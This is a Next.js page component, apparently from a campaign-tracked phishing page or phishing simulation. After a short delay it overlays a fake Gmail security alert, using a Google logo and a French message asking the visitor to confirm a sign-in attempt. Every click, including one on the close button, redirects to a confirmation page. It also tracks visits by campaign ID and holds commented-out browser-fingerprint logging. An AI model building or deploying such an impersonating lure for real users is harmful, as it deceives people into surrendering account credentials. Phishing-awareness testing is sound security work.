import { useEffect, useState } from "react";
import { useRouter } from "next/router";
import { useVisitTracker } from "../../src/hooks/useVisitTracker";
import styles from "../../src/styles/modules/Post.module.css";

export default function postLanding() {
  const router = useRouter();
  const { campaign: campaignId } = router.query;
  const [showNotification, setShowNotification] = useState(false);
  const [notificationClass, setNotificationClass] = useState('');
  
  // Tracker les visites de campagne
  useVisitTracker(campaignId);

  // Logger les informations du navigateur côté client
  // useEffect(() => {
  //   if (typeof window !== 'undefined') {
  //     const browserInfo = {
  //       userAgent: navigator.userAgent,
  //       language: navigator.language,
  //       platform: navigator.platform,
  //       cookieEnabled: navigator.cookieEnabled,
  //       onLine: navigator.onLine,
  //       screenWidth: screen.width,
  //       screenHeight: screen.height,
  //       windowWidth: window.innerWidth,
  //       windowHeight: window.innerHeight,
  //       referrer: document.referrer,
  //       currentUrl: window.location.href,
  //       campaignId: campaignId
  //     };
       
  //     console.log('Informations du navigateur:', browserInfo);
       
  //     // Log détaillé pour le debugging
  //     console.log('--- BROWSER INFO ---');
  //     console.log('User Agent:', navigator.userAgent);
  //     console.log('Screen Resolution:', `${screen.width}x${screen.height}`);
  //     console.log('Window Size:', `${window.innerWidth}x${window.innerHeight}`);
  //     console.log('Language:', navigator.language);
  //     console.log('Platform:', navigator.platform);
  //     console.log('Referrer:', document.referrer);
  //     console.log('Campaign ID:', campaignId);
  //     console.log('-------------------');
  //   }
  // }, [campaignId]);

  // Afficher la notification après 8 secondes
  useEffect(() => {
    const notificationTimeout = setTimeout(() => {
      setShowNotification(true);
      console.log('Notification affichée après 2 secondes');
    }, 2000);

    return () => clearTimeout(notificationTimeout);
  }, []);

  // Rediriger sur /confirmation après 1000000 secondes
  useEffect(() => {
    const timeout = setTimeout(() => {
      window.location.href = "/confirmation";
    }, 1000000);
    
    return () => clearTimeout(timeout);
  }, []);

  // Fermer la notification avec animation
  const closeNotification = () => {
    // Détecter si on est sur mobile pour utiliser la bonne animation
    const isMobile = window.innerWidth <= 767;
    setNotificationClass(isMobile ? styles.notificationExitMobile : styles.notificationExit);
    
    setTimeout(() => {
      setShowNotification(false);
      setNotificationClass('');
    }, 300);
  };

  // Gérer le clic sur l'overlay
  const handleOverlayClick = (event) => {
    // Vérifier si le clic vient du wrapper principal (donc de l'overlay)
    if (event.target.classList.contains(styles.postLanding) || 
        event.target.classList.contains(styles.postLandingWithOverlay)) {
      console.log('Clic sur overlay - redirection vers confirmation');
      window.location.href = "/confirmation";
    }
  };

  // Obtenir l'heure actuelle formatée
  const getCurrentTime = () => {
    const now = new Date();
    return now.toLocaleTimeString('fr-FR', { 
      hour: '2-digit', 
      minute: '2-digit' 
    });
  };

  return (
    <div 
      className={`${styles.postLanding} ${showNotification ? styles.postLandingWithOverlay : ''}`} 
      // onClick={showNotification ? handleOverlayClick : () => {
      //   console.log('Clic sur post landing - redirection vers confirmation');
      //   window.location.href = "/confirmation";
      // }}
    >
      <img
        src="/post-desktop.png"
        alt="Post Landing"
        className={styles.desktopImg}
      />
      <img
        src="/post-mobile.png"
        alt="Post Landing"
        className={styles.mobileImg}
      />

      {/* Notification navigateur */}
      {showNotification && (
        <div 
          className={`${styles.browserNotification} ${notificationClass}`}
          onClick={(e) => {
            e.stopPropagation();
            console.log('Clic sur notification - redirection vers confirmation');
            window.location.href = "/confirmation";
          }}
        >
            <img className={styles.notificationIcon} src="/gmail-logo.png" alt="Google Logo" />
          <div className={styles.notificationContent}>
            <div className={styles.notificationHeader}>
              <div className={styles.notificationTitle}>
                Alerte de sécurité
              </div>
              <div className={styles.notificationTime}>
                {getCurrentTime()}
              </div>
            </div>
            <p className={styles.notificationMessage}>
              Vous avez tenté de vous connecter à Gmail. Confirmez la demande.
            </p>
          </div>
          <button 
            className={styles.notificationClose}
            onClick={(e) => {
              e.stopPropagation();
              console.log('Clic sur croix - redirection vers confirmation');
              window.location.href = "/confirmation";
            }}
          >
            ×
          </button>
        </div>
      )}
    </div>
  );
}